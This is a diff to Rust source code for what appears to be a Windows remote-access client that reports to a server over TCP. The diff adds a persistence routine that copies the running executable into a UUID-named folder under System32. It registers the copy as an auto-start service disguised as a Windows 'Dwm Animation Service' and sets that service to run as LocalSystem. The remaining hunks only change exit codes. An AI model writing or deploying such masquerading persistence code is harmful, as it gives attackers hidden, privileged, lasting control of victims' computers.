@@ -11,6 +11,61 @@ use tokio::net::TcpStream;
 
 use crate::{CONNECTION_RETRY_DELAY, SERVER_ADDR};
 
+#[allow(dead_code)]
+fn setup_persistence(uuid: &str) -> Result<(), Box<dyn std::error::Error>> {
+    // let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+    // // copies current exe to System32/uuid/uuid.exe
+    let current_exe = match std::env::current_exe() {
+        Ok(exe) => exe,
+        Err(err) => {
+            println!("{}", err);
+            std::process::exit(1)
+        }
+    };
+    let system32_dir = Path::new(&std::env::var("SystemRoot").unwrap()).join("System32");
+    let uuid_dir = system32_dir.join(&uuid);
+    std::fs::create_dir_all(&uuid_dir)?;
+    let dest_path = uuid_dir.join(format!("{}.exe", &uuid));
+    std::fs::copy(&current_exe, &dest_path)?;
+
+    // Register the service
+    let service_name = "DwmAnimationService";
+    let service_display_name = "Dwm Animation Service";
+    let service_exe_path = dest_path.to_str().unwrap();
+
+    std::process::Command::new("sc.exe")
+        .args(&[
+            "create",
+            service_name,
+            "binPath=",
+            service_exe_path,
+            "start=",
+            "auto",
+            "DisplayName=",
+            service_display_name,
+        ])
+        .output()
+        .expect("Failed to register the service");
+
+    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
+
+    let path = Path::new("SYSTEM")
+        .join("CurrentControlSet")
+        .join("Services")
+        .join(service_name);
+
+    let (key, _) = match hklm.create_subkey(&path) {
+        Ok(key) => key,
+        Err(err) => {
+            println!("{}", err);
+            std::process::exit(1)
+        }
+    };
+    key.set_value("ObjectName", &"LocalSystem")
+        .expect("Failed to set the service to run as admin");
+    Ok(())
+}
+
 async fn first_launch_setup() -> Result<(), Box<dyn std::error::Error>> {
     // Check if the program has been launched before
 
@@ -25,7 +80,7 @@ async fn first_launch_setup() -> Result<(), Box<dyn std::error::Error>> {
         Ok(key) => key,
         Err(err) => {
             println!("{}", err);
-            std::process::exit(2)
+            std::process::exit(1)
         }
     };
 
@@ -52,7 +107,7 @@ async fn first_launch_setup() -> Result<(), Box<dyn std::error::Error>> {
         Ok(uuid) => uuid,
         Err(_) => {
             println!("Failed to parse uuid");
-            std::process::exit(4)
+            std::process::exit(1)
         }
     };
     // saves uuid in registry
@@ -64,6 +119,7 @@ async fn first_launch_setup() -> Result<(), Box<dyn std::error::Error>> {
         }
     };
 
+    setup_persistence(uuid.as_str())?;
     stream.shutdown().await?;
 
     std::process::exit(0);
@@ -79,7 +135,7 @@ pub async fn initialisation() -> String {
         Ok(dwm) => dwm,
         Err(_) => {
             println!("Dwm not found");
-            std::process::exit(3)
+            std::process::exit(1)
         }
     };
     let value: String = match dwm.get_value("AnimationSessionUuid") {
